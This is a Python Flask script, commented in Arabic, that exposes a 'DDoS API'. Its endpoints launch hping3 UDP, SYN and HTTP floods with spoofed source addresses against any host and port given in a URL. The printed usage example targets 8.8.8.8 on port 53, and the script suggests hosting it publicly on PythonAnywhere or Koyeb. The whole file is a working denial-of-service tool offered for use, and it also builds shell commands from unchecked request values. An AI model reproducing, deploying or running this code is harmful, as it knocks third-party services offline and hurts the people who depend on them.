#!/usr/bin/env python3
"""
API DDoS - سكربت متكامل يعرض الرابط تلقائياً
"""

from flask import Flask, request, jsonify
import threading
import time
import subprocess
import os
import socket

app = Flask(__name__)

# تخزين الهجمات النشطة
active_attacks = {}

# الألوان للطباعة
GREEN = '\033[92m'
BLUE = '\033[94m'
RED = '\033[91m'
YELLOW = '\033[93m'
RESET = '\033[0m'

def get_local_ip():
    """جلب الـ IP المحلي للجهاز"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# ========== هجمات hping3 ==========
def udp_flood_hping3(target_ip, target_port, duration):
    cmd = f"hping3 --flood --udp --rand-source -p {target_port} {target_ip} -d 1400"
    process = subprocess.Popen(cmd, shell=True)
    time.sleep(duration)
    process.terminate()

def syn_flood_hping3(target_ip, target_port, duration):
    cmd = f"hping3 --flood --syn --rand-source -p {target_port} {target_ip}"
    process = subprocess.Popen(cmd, shell=True)
    time.sleep(duration)
    process.terminate()

def http_flood(target_ip, target_port, duration):
    cmd = f"hping3 --flood --http --rand-source -p {target_port} {target_ip}"
    process = subprocess.Popen(cmd, shell=True)
    time.sleep(duration)
    process.terminate()

def all_flood(target_ip, target_port, duration):
    attacks = [
        threading.Thread(target=udp_flood_hping3, args=(target_ip, target_port, duration)),
        threading.Thread(target=syn_flood_hping3, args=(target_ip, target_port, duration)),
        threading.Thread(target=http_flood, args=(target_ip, target_port, duration))
    ]
    for attack in attacks:
        attack.start()
    for attack in attacks:
        attack.join()

# ========== دوال API ==========
@app.route('/')
def home():
    return jsonify({
        "name": "DDoS API",
        "version": "4.0",
        "status": "running",
        "methods": ["UDP", "SYN", "HTTP", "ALL"],
        "endpoints": ["/attack", "/status", "/stop"]
    })

@app.route('/attack')
def attack():
    host = request.args.get('host')
    port = request.args.get('port')
    duration = request.args.get('time')
    method = request.args.get('method', 'UDP').upper()
    
    if not host or not port or not duration:
        return jsonify({"error": "المطلوب: host, port, time"}), 400
    
    try:
        port = int(port)
        duration = int(duration)
        if duration > 180:
            duration = 180
    except:
        return jsonify({"error": "port و time أرقام"}), 400
    
    attack_id = f"{host}:{port}:{int(time.time())}"
    
    active_attacks[attack_id] = {
        "host": host,
        "port": port,
        "method": method,
        "end": time.time() + duration
    }
    
    if method == "UDP":
        thread = threading.Thread(target=udp_flood_hping3, args=(host, port, duration))
    elif method == "SYN":
        thread = threading.Thread(target=syn_flood_hping3, args=(host, port, duration))
    elif method == "HTTP":
        thread = threading.Thread(target=http_flood, args=(host, port, duration))
    else:
        thread = threading.Thread(target=all_flood, args=(host, port, duration))
    
    thread.daemon = True
    thread.start()
    
    return jsonify({
        "status": "started",
        "attack_id": attack_id,
        "host": host,
        "port": port,
        "duration": duration,
        "method": method
    })

@app.route('/status')
def status():
    attacks_list = []
    for aid, data in list(active_attacks.items()):
        remaining = int(data['end'] - time.time())
        if remaining > 0:
            attacks_list.append({
                "id": aid,
                "host": data['host'],
                "port": data['port'],
                "method": data['method'],
                "remaining": remaining
            })
    
    return jsonify({
        "active_count": len(attacks_list),
        "attacks": attacks_list
    })

@app.route('/stop')
def stop():
    for aid in list(active_attacks.keys()):
        del active_attacks[aid]
    subprocess.run("pkill -f hping3", shell=True)
    return jsonify({"status": "stopped", "message": "تم إيقاف جميع الهجمات"})

# ========== عرض الروابط عند التشغيل ==========
def print_urls():
    local_ip = get_local_ip()
    
    print("\n" + "="*60)
    print(f"{GREEN}🔥 API DDoS شغال! 🔥{RESET}")
    print("="*60)
    print(f"\n{YELLOW}📡 الروابط المتاحة:{RESET}\n")
    print(f"{BLUE}→ الرابط المحلي (Local):{RESET} http://127.0.0.1:5000")
    print(f"{BLUE}→ الرابط الشبكة (Network):{RESET} http://{local_ip}:5000")
    print(f"\n{YELLOW}📋 نقاط النهاية (Endpoints):{RESET}")
    print(f"  • GET /          - معلومات الـ API")
    print(f"  • GET /attack?host=X&port=Y&time=Z&method=M - بدء هجوم")
    print(f"  • GET /status    - حالة الهجمات النشطة")
    print(f"  • GET /stop      - إيقاف جميع الهجمات")
    print(f"\n{YELLOW}📝 أمثلة:{RESET}")
    print(f"  http://127.0.0.1:5000/attack?host=8.8.8.8&port=53&time=10&method=UDP")
    print(f"  http://127.0.0.1:5000/status")
    print("\n" + "="*60)
    print(f"{RED}⚠️  لاحظ: هذا الرابط محلي (لجهازك فقط). للاستخدام من أي مكان، ارفع الكود على استضافة مثل PythonAnywhere أو Koyeb.{RESET}")
    print("="*60 + "\n")

if __name__ == '__main__':
    # طباعة الروابط أولاً
    print_urls()
    
    # تشغيل الـ API
    app.run(host='0.0.0.0', port=5000, debug=False)
